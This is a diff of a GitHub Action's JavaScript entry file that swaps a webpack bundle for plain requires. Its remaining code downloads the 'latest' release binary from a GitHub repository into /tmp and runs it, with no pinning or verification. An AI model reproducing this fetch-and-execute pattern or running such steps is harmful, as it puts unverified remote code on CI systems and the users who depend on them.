@@ -1,13 +1,4 @@
-/* © 2026 Softensify Pty Ltd */
-
-/******/ (() => { // webpackBootstrap
-/******/ 	"use strict";
-/******/ 	var __webpack_modules__ = ({
-
-/***/ 836:
-/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
-
-
+"use strict";
 var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
     if (k2 === undefined) k2 = k;
     var desc = Object.getOwnPropertyDescriptor(m, k);
@@ -44,14 +35,14 @@ var __importStar = (this && this.__importStar) || (function () {
 var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
-Object.defineProperty(exports, "__esModule", ({ value: true }));
+Object.defineProperty(exports, "__esModule", { value: true });
 exports.downloadFile = downloadFile;
-const child_process_1 = __nccwpck_require__(317);
-const fs = __importStar(__nccwpck_require__(896));
-const path_1 = __importDefault(__nccwpck_require__(928));
-const stream_1 = __nccwpck_require__(203);
-const promises_1 = __nccwpck_require__(786);
-const os_1 = __importDefault(__nccwpck_require__(857));
+const child_process_1 = require("child_process");
+const fs = __importStar(require("fs"));
+const path_1 = __importDefault(require("path"));
+const stream_1 = require("stream");
+const promises_1 = require("stream/promises");
+const os_1 = __importDefault(require("os"));
 async function downloadFile(url, outputDir = '.') {
     const fileName = path_1.default.basename(new URL(url).pathname);
     const outputPath = path_1.default.join(outputDir, fileName);
@@ -101,7 +92,6 @@ function getBinaryName() {
 async function run() {
     const url = `https://github.com/totheos/action/releases/latest/download/${getBinaryName()}`;
     const filePath = await downloadFile(url, '/tmp');
-    console.log(filePath);
     // Small delay (extra safety for CI environments)
     await new Promise((r) => setTimeout(r, 50));
     const child = await spawnWithRetry(filePath);
@@ -114,96 +104,3 @@ async function run() {
     });
 }
 run();
-
-
-/***/ }),
-
-/***/ 317:
-/***/ ((module) => {
-
-module.exports = require("child_process");
-
-/***/ }),
-
-/***/ 896:
-/***/ ((module) => {
-
-module.exports = require("fs");
-
-/***/ }),
-
-/***/ 857:
-/***/ ((module) => {
-
-module.exports = require("os");
-
-/***/ }),
-
-/***/ 928:
-/***/ ((module) => {
-
-module.exports = require("path");
-
-/***/ }),
-
-/***/ 203:
-/***/ ((module) => {
-
-module.exports = require("stream");
-
-/***/ }),
-
-/***/ 786:
-/***/ ((module) => {
-
-module.exports = require("stream/promises");
-
-/***/ })
-
-/******/ 	});
-/************************************************************************/
-/******/ 	// The module cache
-/******/ 	var __webpack_module_cache__ = {};
-/******/ 	
-/******/ 	// The require function
-/******/ 	function __nccwpck_require__(moduleId) {
-/******/ 		// Check if module is in cache
-/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
-/******/ 		if (cachedModule !== undefined) {
-/******/ 			return cachedModule.exports;
-/******/ 		}
-/******/ 		// Create a new module (and put it into the cache)
-/******/ 		var module = __webpack_module_cache__[moduleId] = {
-/******/ 			// no module.id needed
-/******/ 			// no module.loaded needed
-/******/ 			exports: {}
-/******/ 		};
-/******/ 	
-/******/ 		// Execute the module function
-/******/ 		var threw = true;
-/******/ 		try {
-/******/ 			__webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);
-/******/ 			threw = false;
-/******/ 		} finally {
-/******/ 			if(threw) delete __webpack_module_cache__[moduleId];
-/******/ 		}
-/******/ 	
-/******/ 		// Return the exports of the module
-/******/ 		return module.exports;
-/******/ 	}
-/******/ 	
-/************************************************************************/
-/******/ 	/* webpack/runtime/compat */
-/******/ 	
-/******/ 	if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
-/******/ 	
-/************************************************************************/
-/******/ 	
-/******/ 	// startup
-/******/ 	// Load entry module and return exports
-/******/ 	// This entry module is referenced by other modules so it can't be inlined
-/******/ 	var __webpack_exports__ = __nccwpck_require__(836);
-/******/ 	module.exports = __webpack_exports__;
-/******/ 	
-/******/ })()
-;
